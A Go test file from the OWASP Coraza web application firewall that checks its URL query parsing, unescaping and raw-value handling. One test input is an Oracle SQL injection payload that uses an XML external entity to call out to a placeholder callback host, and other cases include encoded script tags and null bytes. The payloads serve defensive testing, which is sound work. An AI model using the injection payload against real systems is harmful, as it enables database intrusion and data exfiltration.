// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package url

import (
	"testing"
)

var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`

func TestUrlPayloads(t *testing.T) {
	q := ParseQuery(parseQueryInput, '&')
	if len(q["var"]) == 0 {
		t.Error("var is empty")
	}
}

func BenchmarkParseQuery(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ParseQuery(parseQueryInput, '&')
	}
}

var queryUnescapePayloads = map[string]string{
	"sample":    "sample",
	"s%20ample": "s ample",
	"s+ample":   "s ample",
	"s%2fample": "s/ample",
	"s% ample":  "s% ample",  // non-strict sample
	"s%ssample": "s%ssample", // non-strict sample
	"s%00ample": "s\x00ample",
	"%7B%%7d":   "{%}",
	"%7B+%+%7d": "{ % }",
}

func TestQueryUnescape(t *testing.T) {
	for k, v := range queryUnescapePayloads {
		if out := queryUnescape(k); out != v {
			t.Errorf("Error parsing %q, got %q and expected %q", k, out, v)
		}
	}
}

func BenchmarkQueryUnescape(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for k := range queryUnescapePayloads {
			queryUnescape(k)
		}
	}
}

func TestParseQueryRaw(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  map[string][]string
	}{
		{
			name:  "preserves percent-encoded values",
			input: "key=%3Cscript%3E&other=hello",
			want: map[string][]string{
				"key":   {"%3Cscript%3E"},
				"other": {"hello"},
			},
		},
		{
			name:  "preserves double encoding",
			input: "password=Secret%2500",
			want: map[string][]string{
				"password": {"Secret%2500"},
			},
		},
		{
			name:  "preserves plus signs",
			input: "q=hello+world",
			want: map[string][]string{
				"q": {"hello+world"},
			},
		},
		{
			name:  "preserves encoded key names",
			input: "p%61ssword=test",
			want: map[string][]string{
				"p%61ssword": {"test"},
			},
		},
		{
			name:  "empty value",
			input: "key=",
			want: map[string][]string{
				"key": {""},
			},
		},
		{
			name:  "no value (no equals)",
			input: "key",
			want: map[string][]string{
				"key": {""},
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ParseQueryRaw(tt.input, '&')
			for k, wantVals := range tt.want {
				gotVals, ok := got[k]
				if !ok {
					t.Errorf("missing key %q", k)
					continue
				}
				if len(gotVals) != len(wantVals) {
					t.Errorf("key %q: got %d values, want %d", k, len(gotVals), len(wantVals))
					continue
				}
				for i, wv := range wantVals {
					if gotVals[i] != wv {
						t.Errorf("key %q[%d]: got %q, want %q", k, i, gotVals[i], wv)
					}
				}
			}
		})
	}
}

func TestParseQueryBoth(t *testing.T) {
	input := "key=%3Cscript%3E&p%61ssword=Secret%2500&plain=hello"
	decoded, raw := ParseQueryBoth(input, '&')

	// Verify decoded values
	if v := decoded["key"]; len(v) != 1 || v[0] != "<script>" {
		t.Errorf("decoded key: got %v, want [<script>]", v)
	}
	if v := decoded["password"]; len(v) != 1 || v[0] != "Secret%00" {
		t.Errorf("decoded password: got %v, want [Secret%%00]", v)
	}
	if v := decoded["plain"]; len(v) != 1 || v[0] != "hello" {
		t.Errorf("decoded plain: got %v, want [hello]", v)
	}

	// Verify raw values
	if v := raw["key"]; len(v) != 1 || v[0] != "%3Cscript%3E" {
		t.Errorf("raw key: got %v, want [%%3Cscript%%3E]", v)
	}
	if v := raw["p%61ssword"]; len(v) != 1 || v[0] != "Secret%2500" {
		t.Errorf("raw password: got %v, want [Secret%%2500]", v)
	}
	if v := raw["plain"]; len(v) != 1 || v[0] != "hello" {
		t.Errorf("raw plain: got %v, want [hello]", v)
	}
}

func TestParseQueryBothPlusSigns(t *testing.T) {
	// Plus signs: decoded as space in cooked, preserved literally in raw.
	input := "q=hello+world&tag=foo+bar"
	decoded, raw := ParseQueryBoth(input, '&')

	if v := decoded["q"]; len(v) != 1 || v[0] != "hello world" {
		t.Errorf("decoded q: got %v, want [hello world]", v)
	}
	if v := raw["q"]; len(v) != 1 || v[0] != "hello+world" {
		t.Errorf("raw q: got %v, want [hello+world]", v)
	}
	if v := decoded["tag"]; len(v) != 1 || v[0] != "foo bar" {
		t.Errorf("decoded tag: got %v, want [foo bar]", v)
	}
	if v := raw["tag"]; len(v) != 1 || v[0] != "foo+bar" {
		t.Errorf("raw tag: got %v, want [foo+bar]", v)
	}
}

func TestParseQueryBothMultipleValues(t *testing.T) {
	// Multiple values for the same key.
	input := "color=red&color=blue&color=gr%65en"
	decoded, raw := ParseQueryBoth(input, '&')

	if v := decoded["color"]; len(v) != 3 || v[0] != "red" || v[1] != "blue" || v[2] != "green" {
		t.Errorf("decoded color: got %v, want [red blue green]", v)
	}
	if v := raw["color"]; len(v) != 3 || v[0] != "red" || v[1] != "blue" || v[2] != "gr%65en" {
		t.Errorf("raw color: got %v, want [red blue gr%%65en]", v)
	}
}

func TestParseQueryRawMultipleValues(t *testing.T) {
	input := "x=a&x=b%20c&x=d+e"
	got := ParseQueryRaw(input, '&')

	vals, ok := got["x"]
	if !ok {
		t.Fatal("missing key x")
	}
	if len(vals) != 3 {
		t.Fatalf("expected 3 values, got %d: %v", len(vals), vals)
	}
	expected := []string{"a", "b%20c", "d+e"}
	for i, want := range expected {
		if vals[i] != want {
			t.Errorf("x[%d]: got %q, want %q", i, vals[i], want)
		}
	}
}

func TestParseQueryRawEmptyInput(t *testing.T) {
	if got := ParseQueryRaw("", '&'); len(got) != 0 {
		t.Errorf("expected empty map for empty input, got %v", got)
	}
}

func TestParseQueryBothEmptyInput(t *testing.T) {
	decoded, raw := ParseQueryBoth("", '&')
	if len(decoded) != 0 {
		t.Errorf("expected empty decoded map, got %v", decoded)
	}
	if len(raw) != 0 {
		t.Errorf("expected empty raw map, got %v", raw)
	}
}

func BenchmarkParseQueryBoth(b *testing.B) {
	input := "key=%3Cscript%3E&p%61ssword=Secret%2500&plain=hello&q=hello+world"
	for i := 0; i < b.N; i++ {
		ParseQueryBoth(input, '&')
	}
}

func BenchmarkParseQueryRaw(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ParseQueryRaw(parseQueryInput, '&')
	}
}
